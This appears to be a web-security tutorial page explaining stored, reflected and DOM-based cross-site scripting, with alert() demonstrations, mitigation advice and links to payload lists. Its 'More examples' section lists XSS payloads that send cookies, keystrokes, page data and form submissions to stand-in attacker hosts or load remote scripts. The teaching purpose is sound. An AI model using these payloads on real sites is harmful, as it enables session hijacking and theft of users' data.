---
title: "XSS"
description: ""
lead: ""
draft: false
images: []
type: docs
weight: 50
---

<div class="img-border">
<img src="xss.png" width=100%>
</div>
<br><br>



## What is Cross-Site Scripting (XSS)?

Cross-Site Scripting (XSS) is a web application vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. XSS occurs when an application fails to properly validate, sanitize, or escape user-supplied data before including it in a web page. This vulnerability enables attackers to execute arbitrary code, steal sensitive information, hijack user sessions, or launch other malicious activities.

## Types of XSS

### **Stored XSS**
Stored XSS (also known as Persistent XSS) occurs when an attacker injects malicious code into a website or application, and the injected code is permanently stored on the target server. When other users visit the affected page, the malicious script is executed within their browsers, leading to potential attacks.

Let's say there is a social media website where users can post messages on their profiles. The website allows users to include HTML tags in their posts for formatting purposes. However, the website does not properly sanitize or validate user input, which can lead to a stored XSS vulnerability.

1. User A, who has a profile on the website, posts a message on their profile with the following content:

   ```
   <script>
     alert('Stored XSS example!');
     // An attacker could execute any malicious JavaScript code here
   </script>
   ```

2. User B visits User A's profile to view their post. The website retrieves User A's post from the database and displays it on User B's browser.

3. User B's browser interprets the HTML tags in User A's post and executes the embedded JavaScript code. As a result, an alert dialog with the message "Stored XSS example!" pops up on User B's screen.

This example demonstrates how an attacker could exploit a stored XSS vulnerability by injecting malicious code into a website, which then gets stored in a database and later executed on other users' browsers when they view the compromised content.


### **Reflected XSS**
Reflected XSS (also known as Non-Persistent XSS) occurs when user-supplied data is immediately returned by the server without proper validation or encoding. The malicious payload is typically embedded within a URL or a form input, and when the victim clicks on a malicious link or submits a vulnerable form, the injected script is executed in their browser.


Let's say there is a search functionality on a website where users can search for products. The website includes a search query parameter in the URL, and the search term is directly inserted into the HTML response without proper sanitization or encoding.

1. User A wants to search for a product and enters the following search term:

        <script>alert('Reflected XSS example!');</script>

2. The website constructs the search URL and includes the user's input in the query parameter. For example:

   ```
   https://www.example.com/search?query=<script>alert('Reflected XSS example!');</script>
   ```

3. User A clicks on the search button, and the website processes the search request. The server retrieves the search query from the URL and includes it in the HTML response without proper sanitization.

4. The browser receives the response and interprets the JavaScript code embedded in the HTML. As a result, an alert dialog with the message "Reflected XSS example!" pops up on User A's screen.

In this example, an attacker could craft a malicious URL containing a JavaScript payload and trick users into clicking on the link. When users visit the compromised URL, the JavaScript code gets executed within their own browser, leading to potential exploitation.

To mitigate reflected XSS vulnerabilities, it's essential for websites to properly sanitize and encode user input before including it in the HTML response. Additionally, input validation and output encoding techniques, such as HTML entity encoding or Content Security Policy (CSP), can be implemented to further enhance security.

### **DOM-based XSS**
DOM-based XSS occurs when client-side JavaScript code manipulates the Document Object Model (DOM) in an insecure manner, allowing an attacker to inject malicious code. Unlike stored and reflected XSS, DOM-based XSS does not involve sending data to the server; instead, the vulnerability lies within the client-side JavaScript code itself.


1. Let's say there is a website that allows users to customize their profile by setting a preferred theme. The website provides a feature where users can select their preferred theme from a dropdown menu.

2. The website dynamically updates the page's appearance by modifying the DOM (Document Object Model) using JavaScript. It retrieves the user's selected theme from the dropdown menu and applies the corresponding CSS styles to the page.

3. An attacker discovers that the website does not properly sanitize or validate the user's input for the theme selection. They exploit this vulnerability by crafting a malicious theme option.

4. The attacker sets a malicious theme option that includes a script tag with an XSS payload. For example:

   ```
   <option value="</option><script>alert('DOM XSS example!');</script>">
     Malicious Theme
   </option>
   ```

5. User A visits their profile settings and selects the "Malicious Theme" option from the dropdown menu.

6. The website dynamically updates the page's DOM based on the user's selection. In this case, it blindly inserts the attacker's crafted option into the DOM without proper sanitization.

7. As a result, the script tag with the XSS payload gets inserted into the DOM and executed within User A's browser. This leads to an alert dialog with the message "DOM XSS example!" appearing on User A's screen.

In this example, the DOM XSS vulnerability occurs when the website allows user-controlled input to manipulate the DOM directly. The attacker leverages this vulnerability to inject malicious JavaScript code into the page, which then gets executed within the user's browser.

To prevent DOM XSS vulnerabilities, websites should implement proper input validation and output encoding techniques. It's important to sanitize user-controlled input and use safe DOM manipulation methods, such as text node creation or attribute manipulation, to prevent the execution of arbitrary JavaScript code within the DOM.

### More examples of DOM XSS

Certainly! Here are ten additional examples of XSS payloads that can be used to exploit DOM XSS vulnerabilities:
 

 
 Basic Error Alert:
   ```
   <img src=x onerror=alert('DOM XSS example!')>
   ```
 Cookie Theft:
   ```
   <script>document.location='https://malicious-site.com/steal.php?cookie='+document.cookie;</script>
   ```
 Document URL Manipulation:
   ```
   <script>document.location='https://attacker-site.com/log.php?data='+document.URL;</script>
   ```
 Keylogging:
   ```
   <script>document.onkeypress=function(e){new Image().src='https://attacker-site.com/collect.php?k='+e.key;}</script>
   ```
 Form Manipulation:
   ```
   <script>document.forms[0].action='https://attacker-site.com/collect.php';document.forms[0].submit();</script>
   ```
 Data Theft:
   ```
   <script>var sensitiveData=document.getElementById('sensitive-data').innerHTML;new Image().src='https://attacker-site.com/collect.php?data='+encodeURIComponent(sensitiveData);</script>
   ```

 DOM Modification:
   ```
   <script>document.getElementById('target-element').innerHTML='<img src=x onerror=alert("DOM XSS example!")>'; </script>
   ```
 URL Redirection:
   ```
   <script>if (window.top.location !== window.location) { window.top.location.href = 'https://attacker-site.com/evil.html'; }</script>
   ```
 Remote Code Execution:
   ```
   <script src="https://attacker-site.com/malicious.js"></script>
   ```

 Cross-Site Request Forgery (CSRF):
   ```
   <img src="https://vulnerable-site.com/api/vote?userid=123&vote=1" width="0" height="0" style="display:none;">
   ```


**[ ! ] The examples provided are simplified illustrations of XSS vulnerabilities, and the world of web security is constantly evolving. XSS attacks can take various forms, and new techniques and exploits continue to emerge as technology progresses.**

**It's crucial for developers, security professionals, and organizations to stay updated on the latest security best practices, regularly patch software vulnerabilities, and employ robust security measures to mitigate the risks associated with XSS and other web application vulnerabilities. It's also important to perform thorough security testing, including input validation, output encoding, and security code reviews, to identify and address potential vulnerabilities.**

**As attackers find new ways to exploit weaknesses in web applications, it's vital for defenders to remain vigilant and continuously adapt their security strategies to ensure the protection of user data and the integrity of web systems.**

## Understanding the Impact of XSS Attacks
XSS attacks can have severe consequences, including:
- Theft of sensitive user information (e.g., login credentials, personal data)
- Session hijacking
- Defacement of websites
- Delivery of malware or ransomware
- Phishing attacks
- Spread of worms and viruses


##  Payload Resources

 - [Payload Box](https://github.com/payloadbox/xss-payload-list)
 - [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) 